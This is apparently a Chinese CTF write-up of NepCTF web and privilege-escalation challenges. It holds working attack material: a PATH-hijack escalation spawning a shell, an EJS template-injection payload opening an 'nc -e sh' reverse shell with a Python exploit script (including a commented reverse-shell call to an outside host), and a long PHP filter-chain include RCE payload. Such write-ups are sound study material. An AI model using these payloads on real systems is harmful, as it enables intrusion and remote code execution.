- # ez_java_checkin
	- shiro工具直接打
		- 配置环境：首先`sudo dnf install java-1.8.0-openjdk-openjfx`，然后`java -cp /usr/lib/jvm/openjfx8/ -jar xxx.jar`
	- NepcTF{Ezjava_Chekin}
- # 独步天下
	- ## 转生成为镜花水月中的王者
		- 注意：这里的nmap貌似不是正常的nmap, 而是一个只会执行ports-alive的程序
		- 思路：通过设置PATH让nmap执行自定义的ports-alive文件
		- 在`/tmp`下新建fakebin文件夹，将需要执行的命令写入到`ports-alive`这个文件中，`chmod a+x ports-alive`给予其执行权限
		- 然后`export PATH=/tmp/fakebin:/sbin:/usr/sbin:/bin:/usr/bin`
		- 最后`nmap -V`
		- ```shell
		  cd /tmp
		  mkdir fakebin
		  cd fakebin
		  echo 'sh' > ports-alive
		  chmod a+x ports-alive
		  export PATH=/tmp/fakebin:/sbin:/usr/sbin:/bin:/usr/bin
		  nmap -V 
		  whoami
		  ```
	- ## 破除虚妄_探见真实
		- > 未解出，施工中
		- ```shell
		  for i in $(seq 1 100); do
		    echo 192.168.200.$i
		    echo -e "GET / HTTP/1.1\r\nHost: 192.168.200.$i\r\n\r\n" | nc 192.168.200.$i 80 | wc -l
		  done
		  
		  ```
		- 扫到192.168.200.1，看见Apache的默认页面
		- `/index.php`看到`<title>电脑版-中文-ZengCMS后台开发框架_ZengCMS内容管理系统</title>`
		- 审CMS
			- Download controller貌似可以进行任意文件读取
- # Post Crad For You
	- 参考： ((64d7a180-ce15-46d7-b3c5-9ae47612b34e))
	- https://eslam.io/posts/ejs-server-side-template-injection-rce/
	- 抄payload直接打
		- payload
			- ```text
			  /page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
			  ```
		- 注意：因为render函数在传入文件名时会缓存渲染结果，我们需要关闭requests的自动redirect
		- ```python
		  r = base_get(url + "create", params = {
		      "name": "asdf",
		      "address": "asdf",
		      "message": "asdf"
		  }, allow_redirects = False)
		  pageid = r.text.rpartition("pageid=")[2].partition("&name=")[0]
		  print(pageid)
		  
		  payload = "sleep 5"
		  # payload = generate_reverse_shell_payload("xxx.org", 3001)
		  payload = "x;process.mainModule.require('child_process').execSync('{}');s".format(payload)
		  payload = enc_dec.urlencode(payload)
		  
		  r = base_get(url + "page?settings[view options][outputFunctionName]={}".format(payload), params = {
		      "name": "asdf",
		      "address": "asdf",
		      "message": "weshouldntseethis",
		      "pageid": pageid
		  })
		  if "weshouldntseethis" not in r.text:
		      with open("a.html", "w") as f:
		          f.write(r.text)
		  ```
- # Ez_include
	- > 施工中，未解出
	- 利用include实现RCE
		- 使用 ((63bc02d6-ea56-4c2a-a494-0cb277531dba)) 生成payload, 将base64encode前面的iconv删除就可以使用了
		- ```python
		  payload = "php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CN.ISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/tmp/resources/3"
		  ```
	- 利用原生类实现文件夹读取
		- ```php
		  $a=new DirectoryIterator("glob:///*");
		  foreach($a as $f){
		  	echo $f.' ';
		  }
		  ```
-